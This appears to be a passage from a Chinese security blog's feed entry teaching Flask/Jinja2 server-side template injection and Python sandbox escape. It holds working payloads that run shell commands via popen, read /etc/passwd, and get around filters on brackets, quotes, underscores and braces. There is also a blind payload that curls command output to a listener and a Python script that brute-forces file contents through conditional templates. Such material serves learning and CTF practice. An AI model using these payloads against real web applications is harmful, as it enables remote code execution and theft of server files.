</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">12312</span>*<span class="number">213</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://qqfbrw.sn.files.1drv.com/y4mC8SfgvO41Nysziu5yiFZQ-dgrt4Mbr2yZMxrfNC3uTko0znQgmtGRKsR88IMJeS6ZvumqFUf4bdXlmSiJuDha6mdHMnQUtjXtoHnnvqdyKr2eReNQsC9rSCwx5-HnoJJux1DWNQKn116zCWX8oNtnAijvAUFvJJKOLwVY-dnVKr83QH4RqHm8Tfrpts7soJfxYpJWPfE0ZnvyR-VFljxnA?width=503&height=114&cropmode=none" alt><br>代码执行成功<br>试下查看目录，payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'dir'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://qqfarw.sn.files.1drv.com/y4mIdxNYH1oYncJxtIE5v-fRFeQLkpWyC3RYajOrHIyvd3PpJltEW-KAqloU2F3B3U921-1oCcOPmnlHH9RDgKig-_TNmPPK2fzRKOtJpsaGrl_g9tQypX11SAgSBJI1kqY9bE7JPL5Nf-2FiE-aAMPEslrtYAG19QGkV3S2DGF65MPFRVm7S75-UkxvbZFZlAdabwjDo0CygG_l7ZSB3AIlg?width=1909&height=138&cropmode=none" alt><br>getshell 什么的也不用多说了</p><h1 id="python-常用内建属性"><a href="#python-常用内建属性" class="headerlink" title="python 常用内建属性"></a>python 常用内建属性</h1><h2 id="class"><a href="#class" class="headerlink" title="__class__"></a>__class__</h2><p>__class__ 可以用来查看对象的类型,返回值为 type</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">list</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ''.<span class="title">__class__</span>.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">type</span>'&gt;</span></span><br></pre></td></tr></table></figure><h2 id="bases"><a href="#bases" class="headerlink" title="__bases__"></a>__bases__</h2><p>__bases__ 可以列出该类的基类，返回值为 tuple</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__bases__</span><br><span class="line">(&lt;class 'object'&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">object</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ''.<span class="title">__class__</span>.<span class="title">__bases__</span>.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">tuple</span>'&gt;</span></span><br></pre></td></tr></table></figure><h2 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a>__mro__</h2><p>__mro__ 给出了 method resolution order ，即<strong>解析方法调用的顺序</strong>， 返回值为 tuple</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__</span><br><span class="line">(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__class__.__mro__</span><br><span class="line">(&lt;class 'type'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">tuple</span>'&gt;</span></span><br></pre></td></tr></table></figure><h2 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a>__subclasses__()</h2><p>__subclasses__() 用于获取一个类的子类，返回值为 list</p><p>而__subclasses__ 的返回值则是 python 内建方法 builtin_function_or_method</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __subclasses__ of type object at <span class="number">0x00007FFD2B796D30</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">builtin_function_or_method</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ''.<span class="title">__class__</span>.<span class="title">__mro__</span>[1].<span class="title">__subclasses__</span><span class="params">()</span></span></span><br><span class="line">[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, </span><br><span class="line">...</span><br><span class="line">&lt;class 'contextlib._GeneratorContextManagerBase'&gt;, &lt;class 'contextlib._BaseExitStack'&gt;, &lt;class '__future__._Feature'&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__().__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">list</span>'&gt;</span></span><br></pre></td></tr></table></figure><h2 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a>__globals__</h2><p>__globals__ 用于返回一个当前空间下能使用的模块，方法和变量的字典</p><p>这个属性是对函数的操作，即:用法为<code>函数名.__globals__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">()</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>            print(<span class="string">'A.fun'</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A.fun.__globals__</span><br><span class="line">&#123;'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': None, '__annotations__': &#123;&#125;, '__builtins__': &lt;module 'builtins' (built-in)&gt;, 'A': &lt;class '__main__.A'&gt;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>classA = A()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>classA.fun.__globals__</span><br><span class="line">&#123;'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': None, '__annotations__': &#123;&#125;, '__builtins__': &lt;module 'builtins' (built-in)&gt;, 'A': &lt;class '__main__.A'&gt;, 'classA': &lt;__main__.A object at 0x000001F2CA247F98&gt;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>classA.fun.__globals__.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">dict</span>'&gt;</span></span><br></pre></td></tr></table></figure><h2 id="builtin-和-builtins"><a href="#builtin-和-builtins" class="headerlink" title="__builtin__ 和 __builtins__"></a>__builtin__ 和 __builtins__</h2><p>启动Python解释器或运行一个Python程序时，内建名称空间都是从__builtins__模块中加载的，只是__builtins__本身是对Python内建模块__builtin__的引用，而这种引用又分下面两种情况:</p><ul><li>如果是在主模块__main__中，__builtins__直接引用__builtin__模块，此时模块名__builtins__与模块名__builtin__指向的都是同一个模块，即<builtin>内建模块(这里要注意变量名和对象本身的区别)</builtin></li><li>如果不是在主模块中，那么__builtins__只是引用了__builtin__.__dict__</li></ul><p>建议查看官方文档 <a href="https://docs.python.org/zh-cn/3/library/builtins.html" target="_blank" rel="noopener">python3 builtins</a></p><p><a href="https://docs.python.org/zh-cn/2.7/library/__builtin__.html" target="_blank" rel="noopener">python2 __builtin__</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 3.7.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(<span class="string">'builtin'</span>)</span><br><span class="line">[<span class="string">'__add__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__getnewargs__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__mod__'</span>, <span class="string">'__mul__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__rmod__'</span>, <span class="string">'__rmul__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'capitalize'</span>, <span class="string">'casefold'</span>, <span class="string">'center'</span>, <span class="string">'count'</span>, <span class="string">'encode'</span>, <span class="string">'endswith'</span>, <span class="string">'expandtabs'</span>, <span class="string">'find'</span>, <span class="string">'format'</span>, <span class="string">'format_map'</span>, <span class="string">'index'</span>, <span class="string">'isalnum'</span>, <span class="string">'isalpha'</span>, <span class="string">'isascii'</span>, <span class="string">'isdecimal'</span>, <span class="string">'isdigit'</span>, <span class="string">'isidentifier'</span>, <span class="string">'islower'</span>, <span class="string">'isnumeric'</span>, <span class="string">'isprintable'</span>, <span class="string">'isspace'</span>, <span class="string">'istitle'</span>, <span class="string">'isupper'</span>, <span class="string">'join'</span>, <span class="string">'ljust'</span>, <span class="string">'lower'</span>, <span class="string">'lstrip'</span>, <span class="string">'maketrans'</span>, <span class="string">'partition'</span>, <span class="string">'replace'</span>, <span class="string">'rfind'</span>, <span class="string">'rindex'</span>, <span class="string">'rjust'</span>, <span class="string">'rpartition'</span>, <span class="string">'rsplit'</span>, <span class="string">'rstrip'</span>, <span class="string">'split'</span>, <span class="string">'splitlines'</span>, <span class="string">'startswith'</span>, <span class="string">'strip'</span>, <span class="string">'swapcase'</span>, <span class="string">'title'</span>, <span class="string">'translate'</span>, <span class="string">'upper'</span>, <span class="string">'zfill'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__</span><br><span class="line">&lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(__builtins__)</span><br><span class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BlockingIOError'</span>, <span class="string">'BrokenPipeError'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'ChildProcessError'</span>, <span class="string">'ConnectionAbortedError'</span>, <span class="string">'ConnectionError'</span>, <span class="string">'ConnectionRefusedError'</span>, <span class="string">'ConnectionResetError'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FileExistsError'</span>, <span class="string">'FileNotFoundError'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'InterruptedError'</span>, <span class="string">'IsADirectoryError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'ModuleNotFoundError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotADirectoryError'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'PermissionError'</span>, <span class="string">'ProcessLookupError'</span>, <span class="string">'RecursionError'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'ResourceWarning'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StopAsyncIteration'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'TimeoutError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'WindowsError'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'_'</span>, <span class="string">'__build_class__'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>, <span class="string">'abs'</span>, <span class="string">'all'</span>, <span class="string">'any'</span>, <span class="string">'ascii'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'breakpoint'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'exit'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'vars'</span>, <span class="string">'zip'</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 2.7.15</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><h1 id="flask-ssti-常用的-bypass"><a href="#flask-ssti-常用的-bypass" class="headerlink" title="flask ssti 常用的 bypass"></a>flask ssti 常用的 bypass</h1><h2 id="绕过中括号"><a href="#绕过中括号" class="headerlink" title="绕过中括号 []"></a>绕过中括号 []</h2><h3 id="利用-getitem-函数"><a href="#利用-getitem-函数" class="headerlink" title="利用 __getitem__()函数"></a>利用 <code>__getitem__()</code>函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="string">""</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">'ls'</span>).read()</span><br></pre></td></tr></table></figure><h2 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h2><h3 id="利用chr-函数"><a href="#利用chr-函数" class="headerlink" title="利用chr()函数"></a>利用<code>chr()</code>函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(chr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">116</span>)%<span class="number">2</span>bchr(<span class="number">99</span>)%<span class="number">2</span>bchr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">119</span>)%<span class="number">2</span>bchr(<span class="number">100</span>)).read() &#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="利用requests对象传参"><a href="#利用requests对象传参" class="headerlink" title="利用requests对象传参"></a>利用requests对象传参</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">""</span>.__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(request.args.path).read() &#125;&#125;</span><br><span class="line">path=/etc/passwd</span><br></pre></td></tr></table></figure><h2 id="绕过下划线"><a href="#绕过下划线" class="headerlink" title="绕过下划线"></a>绕过下划线</h2><h3 id="利用requests对象传参-1"><a href="#利用requests对象传参-1" class="headerlink" title="利用requests对象传参"></a>利用requests对象传参</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">''</span>[request.args.<span class="keyword">class</span>][request.args.mro][<span class="number">2</span>][request.args.subclasses]()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read() &#125;&#125;</span><br><span class="line">class=__class__</span><br><span class="line">mro=__mro__</span><br><span class="line">subclasses=__subclasses__</span><br></pre></td></tr></table></figure><h2 id="绕过大括号"><a href="#绕过大括号" class="headerlink" title="绕过大括号"></a>绕过大括号</h2><h3 id="利用控制语句-37-37"><a href="#利用控制语句-37-37" class="headerlink" title="利用控制语句{&#37; &#37;}"></a>利用控制语句{&#37; &#37;}</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">'curl http://127.0.0.1:7999/?i=`whoami`'</span>).read()==<span class="string">'p'</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/test'</span>).read()[<span class="number">0</span>:<span class="number">1</span>]==<span class="string">'p'</span> %&#125;yes&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>读文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">dic = <span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&amp;*()_+-=[]&#123;&#125;;\':\",./&lt;&gt;?\\|'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">150</span>):</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> dic:</span><br><span class="line">payload = <span class="string">'&#123;% if "".__class__.__mro__[2].__subclasses__()[40](\'/tmp/test\').read()['</span> + str(i) + <span class="string">']==\''</span> + _ + <span class="string">'\' %&#125;yes&#123;% endif %&#125;'</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'data'</span>: payload,</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url, data=data).content.decode(<span class="string">'utf8'</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'yes'</span> <span class="keyword">in</span> r:</span><br><span class="line">flag += _</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="同时绕过-大括号-和-下划线"><a href="#同时绕过-大括号-和-下划线" class="headerlink" title="同时绕过 大括号 和 下划线"></a>同时绕过 大括号 和 下划线</h2><h3 id="利用-amp-attr"><a href="#利用-amp-attr" class="headerlink" title="利用 | &amp; attr()"></a>利用 | &amp; attr()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">print</span> <span class="string">""</span>|attr(request.args.<span class="keyword">class</span>)|attr(request.args.base)|attr(request.args.subclasses)()|attr(request.args.getitem)(<span class="number">99</span>)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(<span class="string">"o"</span>+<span class="string">"s"</span>)|attr(<span class="string">"popen"</span>)(<span class="string">"ls"</span>)|attr(request.args.re)()|safe %&#125;</span><br><span class="line">globals=__globals__</span><br><span class="line">subclasses=__subclasses__</span><br><span class="line">re=read</span><br><span class="line">init=__init__</span><br><span class="line">base=__base__</span><br><span class="line">class=__class__</span><br><span class="line">getitem=__getitem__</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li><p>flask + jinja2 的 SSTI 和 python 沙箱逃逸有密不可分的关系，只有自己把内建函数搞清楚才能在遇到的时候靠自己写出来payload</p></li><li><p>遇到SSTI第一步一定要判断前后端是什么语言什么框架。</p></li></ul><p>附:SSTI 模板判断导图，模板-语言关系图</p><p><img src="https://q6fcrw.sn.files.1drv.com/y4myLNDZak2pCjhPIenf32kI7a3LLRkhH0Ir5BIv4Ffn6A7hmtH7rKKPjLPQ5H-n1Ehzisv7N3J1cZI3HxPSTIOguXF95B3z7i0AYW1DKfqLhEg-u6rZmPuu0Ro6T2tu14uOotDOS96PD-n60n7e4v6uquf8rquH1i5InQPcbnZld8TN1C2_MhZckiTGHFXJOWIakiBMEpaCHvJkF2TaFXVYw?width=640&height=386&cropmode=none" alt></p><p><img src="https://q6farw.sn.files.1drv.com/y4mU28XYNAZtf0cR4k__c2hnFenGREBawUThRvg9Z66f12ZGgEZVVXiZ36jaTDITgiGpeigBlYklGeMGdAdF3jURQF7wZUu4vYHm7W3mC8MBJwkWPuBvVDwfzycHnCjGI3cw-dwI7JaMcb1-ggC_TJJlpN5x91SebR47n9pzx_CijUxd4B9_ScNkJZMeGO-IHN4pSKgvSpbhA1ax8YnYrnzaQ?width=732&height=835&cropmode=none" alt></p><p>图片来源:<a href="https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png" target="_blank" rel="noopener">https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png</a></p><hr><p>参考文章:</p><p><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a><br><a href="http://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/</a><br><a href="https://blog.51cto.com/xpleaf/1764849" target="_blank" rel="noopener">https://blog.51cto.com/xpleaf/1764849</a><br><a href="https://docs.python.org/3/" target="_blank" rel="noopener">https://docs.python.org/3/</a><br><a href="https://blog.csdn.net/qq_35078631/article/details/78504415" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/78504415</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://8ke7rw.sn.files.1drv.com/y4maedzleRsLFxdY5nF7fH88VfDC11rTKHBin0_-Havq7y5z6Ptgod5u_uLfRV1AbFpNIQYOpa0OEMa70_bz0tlETO78KV8ZrSqi9I5dGbTXv7Rem3JU-mZPth3QjkMisOsa_nstR_UQKWjGALwA_k9h3KOfJhnZFNRO6EZ66tBaVCs8CZVaK-CiUqzQgFgeZVd0GEgxCheZsVDOQ6plTqGIw?width=807&amp;height=404&amp;cropmode=none&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;推荐文章 &lt;a href=&quot;https://portswigger.net/blog/server-side-template-injection&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://portswigger.net/blog/server-side-template-injection&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以 flask+jinja2 的 SSTI 为例分析 SSTI&lt;/p&gt;
    
    </summary>
    
      <category term="Learning" scheme="http://AbelChe.com/categories/Learning/"/>
    
    
      <category term="web" scheme="http://AbelChe.com/tags/web/"/>
    
      <category term="SSTI" scheme="http://AbelChe.com/tags/SSTI/"/>
    
      <category term="服务端模板注入" scheme="http://AbelChe.com/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
      <category term="python 沙箱逃逸" scheme="http://AbelChe.com/tags/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>WP-HCTF2017-Deserted place</title>
    <link href="http://AbelChe.com/2019/07/26/Writeup/WP-HCTF2017-Deserted-place/"/>
